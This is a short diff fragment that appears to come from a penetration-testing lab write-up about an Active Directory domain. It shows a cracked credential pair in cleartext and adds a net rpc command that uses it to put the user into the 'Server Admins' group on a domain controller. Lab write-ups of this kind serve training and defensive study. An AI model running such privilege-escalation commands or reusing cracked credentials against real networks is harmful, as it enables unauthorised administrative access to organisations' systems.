@@ -2522,3 +2522,7 @@ Stopped: Sat Nov 14 16:07:39 2026
 ```
 
 ttimmons:Repeat09
+
+```bash
+net rpc group addmem "Server Admins" "ttimmons" -U "INLANEFREIGHT.LOCAL"/"ttimmons"%"Repeat09" -S DC01
+```
